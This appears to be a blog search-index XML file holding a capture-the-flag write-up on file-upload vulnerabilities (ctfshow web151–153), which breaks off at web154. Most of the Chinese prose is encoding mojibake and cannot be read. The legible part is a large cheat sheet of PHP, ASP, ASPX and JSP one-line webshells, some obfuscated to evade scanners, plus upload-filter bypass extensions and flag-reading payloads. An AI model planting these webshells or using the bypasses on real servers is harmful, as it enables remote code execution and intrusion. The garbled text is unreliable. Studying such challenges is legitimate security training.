<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>EZupload</title>
      <link href="/2024/07/02/EZupload/"/>
      <url>/2024/07/02/EZupload/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p><a href="https://blog.csdn.net/qq_43390703/article/details/104858705">æ–‡ä»¶ä¸Šä¼ æ¼æ´ (ä¸Šä¼ çŸ¥è¯†ç‚¹ã€é¢˜å‹æ€»ç»“å¤§å…¨-uploadé¶åœºå…¨è§£)</a></p><h4 id="äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› "><a href="#äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› " class="headerlink" title="äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› "></a>äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› </h4><p><strong>åŸå› ï¼š</strong></p><ul><li>å¯¹äºä¸Šä¼ æ–‡ä»¶çš„åç¼€åï¼ˆæ‰©å±•åï¼‰æ²¡æœ‰åšè¾ƒä¸ºä¸¥æ ¼çš„é™åˆ¶</li><li>å¯¹äºä¸Šä¼ æ–‡ä»¶çš„MIMETYPE(ç”¨äºæè¿°æ–‡ä»¶çš„ç±»å‹çš„ä¸€ç§è¡¨è¿°æ–¹æ³•) æ²¡æœ‰åšæ£€æŸ¥</li><li>æƒé™ä¸Šæ²¡æœ‰å¯¹äºä¸Šä¼ çš„æ–‡ä»¶ç›®å½•è®¾ç½®ä¸å¯æ‰§è¡Œæƒé™ï¼Œï¼ˆå°¤å…¶æ˜¯å¯¹äºshebangç±»å‹çš„æ–‡ä»¶ï¼‰</li><li>å¯¹äºweb serverå¯¹äºä¸Šä¼ æ–‡ä»¶æˆ–è€…æŒ‡å®šç›®å½•çš„è¡Œä¸ºæ²¡æœ‰åšé™åˆ¶</li></ul><p><strong>åŸç†ï¼š</strong><br>åœ¨ WEB ä¸­è¿›è¡Œæ–‡ä»¶ä¸Šä¼ çš„åŸç†æ˜¯é€šè¿‡å°†è¡¨å•è®¾ä¸º multipart&#x2F;form-dataï¼ŒåŒæ—¶åŠ å…¥æ–‡ä»¶åŸŸï¼Œè€Œåé€šè¿‡ HTTP åè®®å°†æ–‡ä»¶å†…å®¹å‘é€åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ç«¯è¯»å–è¿™ä¸ªåˆ†æ®µ (multipart) çš„æ•°æ®ä¿¡æ¯ï¼Œå¹¶å°†å…¶ä¸­çš„æ–‡ä»¶å†…å®¹æå–å‡ºæ¥å¹¶ä¿å­˜çš„ã€‚é€šå¸¸ï¼Œåœ¨è¿›è¡Œæ–‡ä»¶ä¿å­˜çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ç«¯ä¼šè¯»å–æ–‡ä»¶çš„åŸå§‹æ–‡ä»¶åï¼Œå¹¶ä»è¿™ä¸ªåŸå§‹æ–‡ä»¶åä¸­å¾—å‡ºæ–‡ä»¶çš„æ‰©å±•åï¼Œè€Œåéšæœºä¸ºæ–‡ä»¶èµ·ä¸€ä¸ªæ–‡ä»¶å ( ä¸ºäº†é˜²æ­¢é‡å¤ )ï¼Œå¹¶ä¸”åŠ ä¸ŠåŸå§‹æ–‡ä»¶çš„æ‰©å±•åæ¥ä¿å­˜åˆ°æœåŠ¡å™¨ä¸Š</p><p>æ–‡ä»¶ä¸Šä¼ åå¯¼è‡´çš„å¸¸è§å®‰å…¨é—®é¢˜ä¸€èˆ¬æœ‰:</p><ul><li><p>ä¸Šä¼ æ–‡ä»¶æ˜¯Webè„šæœ¬è¯­è¨€ï¼ŒæœåŠ¡å™¨çš„Webå®¹å™¨è§£é‡Šå¹¶æ‰§è¡Œäº†ç”¨æˆ·ä¸Šä¼ çš„è„šæœ¬,å¯¼è‡´ä»£<br>ç æ‰§è¡Œ;</p></li><li><p>ä¸Šä¼ æ–‡ä»¶æ˜¯Flashçš„ç­–ç•¥æ–‡ä»¶crossdomain.xml,é»‘å®¢ç”¨ä»¥æ§åˆ¶Flashåœ¨è¯¥åŸŸä¸‹çš„è¡Œä¸º(å…¶<br>ä»–é€šè¿‡ç±»ä¼¼æ–¹å¼æ§åˆ¶ç­–ç•¥æ–‡ä»¶çš„æƒ…å†µç±»ä¼¼);</p></li><li><p>ä¸Šä¼ æ–‡ä»¶æ˜¯ç—…æ¯’ã€æœ¨é©¬æ–‡ä»¶ï¼Œé»‘å®¢ç”¨ä»¥è¯±éª—ç”¨æˆ·æˆ–è€…ç®¡ç†å‘˜ä¸‹è½½æ‰§è¡Œ:</p></li><li><p>ä¸Šä¼ æ–‡ä»¶æ˜¯é’“é±¼å›¾ç‰‡æˆ–ä¸ºåŒ…å«äº†è„šæœ¬çš„å›¾ç‰‡ï¼Œåœ¨æŸäº›ç‰ˆæœ¬çš„æµè§ˆå™¨ä¸­ä¼šè¢«ä½œä¸ºè„šæœ¬æ‰§<br>è¡Œï¼Œè¢«ç”¨äºé’“é±¼å’Œæ¬ºè¯ˆã€‚</p></li><li><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›ä¸å¸¸è§çš„åˆ©ç”¨æ–¹æ³•ï¼Œæ¯”å¦‚å°†ä¸Šä¼ æ–‡ä»¶ä½œä¸ºä¸€ä¸ªå…¥å£,æº¢å‡ºæœåŠ¡å™¨çš„åå°å¤„ç†ç¨‹åºï¼Œå¦‚å›¾ç‰‡è§£ææ¨¡å—;æˆ–è€…ä¸Šä¼ -ä¸€ä¸ªåˆæ³•çš„æ–‡æœ¬æ–‡ä»¶ï¼Œ å…¶å†…å®¹åŒ…å«äº†PHPè„šæœ¬ï¼Œå†é€šè¿‡â€œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(Local File Include)â€æ‰§è¡Œæ­¤è„šæœ¬;ç­‰ç­‰ã€‚æ­¤ç±»é—®é¢˜ä¸åœ¨æ­¤ç»†è¿°ã€‚</p></li></ul><h4 id="å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬"><a href="#å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬"></a>å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬</h4><pre class="language-php" data-language="php"><code class="language-php">##PHPï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r00ts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo() @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd"); </span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo();</span><span class="token variable">$func</span> <span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//?func=system&amp;cmd=whoami</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//print_r($new_array);</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo()</span>@<span class="token function">call_user_func</span><span class="token punctuation">(</span>assert<span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo()</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?func=system&amp;cmd=whoami</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'asse'</span><span class="token operator">.</span><span class="token string single-quoted-string">'rt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> phpç¯å¢ƒ>=&lt;5.6æ‰èƒ½ç”¨<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  phpç¯å¢ƒ>=5.6æ‰èƒ½ç”¨<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token variable">$_GET1</span><span class="token punctuation">)</span><span class="token operator">.</span>@<span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>//å®¹é”™ä»£ç  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//ä½¿ç”¨Lankerä¸€å¥è¯å®¢æˆ·ç«¯çš„ä¸“å®¶æ¨¡å¼æ‰§è¡Œç›¸å…³çš„PHPè¯­å¥ <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[email]/e"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>/*ä½¿ç”¨è¿™ä¸ªå,ä½¿ç”¨èœåˆ€ä¸€å¥è¯å®¢æˆ·ç«¯åœ¨é…ç½®è¿æ¥çš„æ—¶å€™åœ¨"é…ç½®"ä¸€æ è¾“å…¥*/:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>O</span><span class="token punctuation">></span></span>h=@eval_r($_POST1);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>O</span><span class="token punctuation">></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$_GET['r']`</span> <span class="token delimiter important">?></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">@<span class="token function">eval_r</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span>sb<span class="token punctuation">]</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> //ç»•è¿‡<span class="token php language-php"><span class="token delimiter important">&lt;?</span>é™åˆ¶çš„ä¸€å¥è¯<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token function">php</span> <span class="token punctuation">(</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>   ä¸Šé¢è¿™å¥æ˜¯é˜²æ€é˜²æ‰«çš„ï¼ç½‘ä¸Šå¾ˆå°‘äººç”¨ï¼å¯ä»¥æ’åœ¨ç½‘é¡µä»»ä½•ASPæ–‡ä»¶çš„æœ€åº•éƒ¨ä¸ä¼šå‡ºé”™ï¼Œæ¯”å¦‚ index.aspé‡Œé¢ä¹Ÿæ˜¯å¯ä»¥çš„ï¼<span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> åŠ äº†åˆ¤æ–­çš„PHPä¸€å¥è¯ï¼Œä¸ä¸Šé¢çš„ASPä¸€å¥è¯ç›¸åŒé“ç†ï¼Œä¹Ÿæ˜¯å¯ä»¥æ’åœ¨ä»»ä½•PHPæ–‡ä»¶ çš„æœ€åº•éƒ¨ä¸ä¼šå‡ºé”™ï¼&lt;%execute request(â€œclassâ€)%>&lt;%'&lt;% loop &lt;%:%>&lt;%'&lt;% loop &lt;%:%>&lt;%execute request (â€œclassâ€)%>&lt;%execute request(â€œclassâ€)'&lt;% loop &lt;%:%> æ— é˜²ä¸‹è½½è¡¨ï¼Œæœ‰é˜²ä¸‹è½½è¡¨å¯å°è¯•æ’å…¥ä»¥ä¸‹è¯­å¥çªç ´çš„ä¸€å¥è¯ &lt;%eval(request(â€œ1â€³)):response.end%> å¤‡ä»½ä¸“ç”¨</code></pre><pre class="language-jsp" data-language="jsp"><code class="language-jsp">##JSPï¼š&lt;%if(request.getParameter(&quot;f&quot;)!&#x3D;null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; æäº¤å®¢æˆ·ç«¯ &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;textareaname&#x3D;&quot;t&quot;&gt;&lt;&#x2F;textarea&gt;&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot;value&#x3D;&quot;æäº¤&quot;&gt;&lt;&#x2F;form&gt;</code></pre><pre class="language-asp" data-language="asp"><code class="language-asp">##ASP&lt;%eval(Request.Item[&quot;r00ts&quot;],â€unsafeâ€);%&gt;&lt;%IfRequest(â€œ1â€³)&lt;&gt;â€&quot;ThenExecuteGlobal(Request(â€œ1â€³))%&gt; &lt;%execute(request(â€œ1â€³))%&gt; &lt;scriptrunat&#x3D;server&gt;execute request(â€œ1â€³)&lt;&#x2F;script&gt; ä¸ç”¨&#39;&lt;,&gt;â€˜çš„aspä¸€å¥è¯ </code></pre><pre class="language-asp" data-language="asp"><code class="language-asp">##aspx&lt;scriptrunat&#x3D;â€serverâ€&gt;WebAdmin2Y.x.y aaaaa &#x3D;newWebAdmin2Y.x.y (â€œadd6bb58e139be10â€³);&lt;&#x2F;script&gt; &lt;script language&#x3D;&quot;C#&quot;runat&#x3D;&quot;server&quot;&gt;WebAdmin2Y.x.y a&#x3D;new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;&#x2F;script&gt; &lt;%eval request(chr(35))%&gt;  ä¸ç”¨åŒå¼•å·çš„ä¸€å¥è¯ã€‚</code></pre><h4 id="å¸¸è§ç»•è¿‡å§¿åŠ¿"><a href="#å¸¸è§ç»•è¿‡å§¿åŠ¿" class="headerlink" title="å¸¸è§ç»•è¿‡å§¿åŠ¿"></a>å¸¸è§ç»•è¿‡å§¿åŠ¿</h4><h5 id="å¤§å†™ç»•è¿‡-æˆ–-åŒè§£æåç¼€åç»•è¿‡"><a href="#å¤§å†™ç»•è¿‡-æˆ–-åŒè§£æåç¼€åç»•è¿‡" class="headerlink" title="å¤§å†™ç»•è¿‡ æˆ– åŒè§£æåç¼€åç»•è¿‡"></a>å¤§å†™ç»•è¿‡ æˆ– åŒè§£æåç¼€åç»•è¿‡</h5><pre class="language-txt" data-language="txt"><code class="language-txt">åŒè§£æååç¼€ï¼šã€€ã€€PHPï¼š.php .php2 .php3 .php4 .php5 .php6 .php7 .phpç©ºæ ¼ .phtml .pgifã€€ã€€ã€€ã€€ .shtml .htaccess .phar .inc ã€€ã€€ASPï¼š.asp .aspx .config .ashx .asmx .aspq .axd .cshtm .cshtml .rem .soapã€€ã€€ã€€ã€€ .vbhtm .vbhtml .asa .cer .shtmlã€€ã€€JSPï¼š.jsp .jspx .jsw .jsv .sjspf .wss .do .action</code></pre><p>ç®€å•æ¥è¯´å°±æ˜¯ç”¨å„ç§å§¿åŠ¿ç»•è¿‡æœåŠ¡å™¨å¤„ç†é€»è¾‘ä¸Šä¼ æœ¨é©¬æ‹¿åˆ°WebShell</p><h3 id="web151-170"><a href="#web151-170" class="headerlink" title="web151-170"></a>web151-170</h3><h4 id="web151-Jså‰ç«¯é™åˆ¶"><a href="#web151-Jså‰ç«¯é™åˆ¶" class="headerlink" title="web151(Jså‰ç«¯é™åˆ¶)"></a>web151(Jså‰ç«¯é™åˆ¶)</h4><p>å‰ç«¯é™åˆ¶äº†åªèƒ½ä¸Šä¼ pngæ–‡ä»¶ï¼Œå¯ä»¥æŠ“åŒ…åä¿®æ”¹æ–‡ä»¶åç¼€å</p><p><img src="web151.png" loading="lazy"></p><p>Payloadï¼š</p><blockquote><p>&#x2F;upload&#x2F;1.php</p><p>POST:attack&#x3D;system(â€˜tac ..&#x2F;flag.phpâ€™);</p></blockquote><h4 id="web152-MIMEåç«¯ç»•è¿‡"><a href="#web152-MIMEåç«¯ç»•è¿‡" class="headerlink" title="web152(MIMEåç«¯ç»•è¿‡)"></a>web152(MIMEåç«¯ç»•è¿‡)</h4><p>è™½ç„¶åç«¯ç®€å•æ£€æµ‹ï¼Œä½†æ˜¯å¦‚æœç›´æ¥ä¸Šä¼ png,æŠ“åŒ…çš„æ—¶å€™å†æ”¹åç¼€ï¼Œå…¶å®ä¸ç”¨ä¿®æ”¹Content-Typeï¼Œæ–¹æ³•åŒä¸Š</p><p><strong>MIME</strong></p><p>MIMEï¼ˆMultipurpose Internal MailExtensionsï¼‰å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚<br>æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæ¥æŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚<br>æ¯ä¸ªMIMEç±»å‹ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå‰é¢æ˜¯æ•°æ®çš„å¤§ç±»å‹ï¼Œä¾‹å¦‚å£°éŸ³audioï¼Œå›¾åƒimageç­‰ï¼Œåé¢å®šä¹‰å…·ä½“çš„ç§ç±»<br><strong>å¸¸è§çš„MIMEç±»å‹ï¼š</strong><br>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ï¼š.htmlâ€”â€”&gt;text&#x2F;html<br>xmlæ–‡æ¡£ï¼š.xmlâ€”â€”&gt;text&#x2F;xml<br>XHTMLæ–‡æ¡£ï¼š.xhtmlâ€”â€”&gt;application&#x2F;xhtml+xml<br>æ™®é€šæ–‡æœ¬ï¼š.txtâ€”â€”&gt;text&#x2F;plain<br>RTFæ–‡æœ¬ï¼š.rtfâ€”â€”&gt;application&#x2F;rtf<br>pngå›¾ç‰‡:.pngâ€”â€”&gt;image&#x2F;png</p><p>è¿™åº”è¯¥æ˜¯é¢„æœŸè§£ï¼Œæœ‰ç‚¹éº»çƒ¦</p><blockquote><p>ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼ŒåŒæ—¶ç”¨burpæŠ“åŒ…ï¼Œå°†burpä¸­çš„Content-Type:<br>application&#x2F;octet-streamä¿®æ”¹ä¸ºContent-Type:<br>image&#x2F;pngï¼Œå³è®©æœåŠ¡å™¨è®¤ä¸ºè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶å»è§£ææ‰§è¡Œ</p></blockquote><h4 id="web153-user-ini"><a href="#web153-user-ini" class="headerlink" title="web153(.user.ini)"></a>web153(.user.ini)</h4><p>å¸¸è§„å§¿åŠ¿éƒ½è¯•äº†å‘ç°æ²¡æ³•ç»•è¿‡ï¼Œå‘ç°uploadå¯ä»¥è®¿é—®ï¼Œè¯´æ˜é‡Œé¢å«æœ‰phpæ–‡ä»¶å¯ä»¥è€ƒè™‘ä½¿ç”¨.user.iniç»•è¿‡</p><p><strong>.user.ini</strong></p><ul><li>å½“å‰ç›®å½•é‡Œé¢æœ‰phpæ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥è¿ç”¨inié…ç½®æ–‡ä»¶è¿›è¡Œé…ç½®è¿™ä¸ªphpæ–‡ä»¶</li><li>å’Œæ–‡ä»¶åŒ…å«æœ‰å…³çš„é…ç½®é¡¹æœ‰auto_append_fileå’Œauto_prepend_file</li></ul><p>åŸç†: æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼ˆå¦‚a.jpgï¼‰ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å°±ä¼šè¢«åŒ…å«åœ¨è¦æ‰§è¡Œçš„phpæ–‡ä»¶ä¸­ï¼ˆå¦‚index.phpï¼‰ç±»</p><p>ä¼¼äºåœ¨index.phpä¸­æ’å…¥ä¸€å¥ï¼šrequire(.&#x2F;a.jpg);è¿™ä¸¤ä¸ªè®¾ç½®çš„åŒºåˆ«åªæ˜¯åœ¨äºauto_prepend_fileæ˜¯åœ¨</p><p>æ–‡ä»¶å‰æ’å…¥ï¼›auto_append_fileåœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰exit()æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰æ‰€ä»¥è¦æ±‚å½“</p><p>å‰ç›®å½•å¿…é¡»è¦æœ‰phpæ–‡ä»¶,å·§åˆçš„æ˜¯è¿™é¢˜uploadç›®å½•ä¸‹æœ‰ä¸ªindex.phpæ‰€ä»¥è¿™ç§æ–¹å¼æ˜¯å¯ä»¥æˆåŠŸçš„ã€‚</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">1.txt</span></code></pre><p>ç„¶åä¸Šä¼ 1.txt è¿™ä¸ª1.txtæœ¨é©¬å°±è¢«è‡ªåŠ¨åŒ…å«è¿›åŸæ¥ç›®å½•é‡Œçš„phpæ–‡ä»¶äº†ï¼ˆä¸€èˆ¬æ˜¯index.phpï¼‰</p><p>Payloadï¼š&#x2F;upload?attack&#x3D;system(â€˜tac ..&#x2F;flag.phpâ€™);</p><h4 id="web154-PHPçŸ­æ ‡ç­¾"><a href="#web154-PHPçŸ­æ ‡ç­¾" class="headerlink" title="web154(PHPçŸ­æ ‡ç­¾)"></a>web154(PHPçŸ­æ ‡ç­¾)</h4><p>å‘ç°ä¸Šä¼ 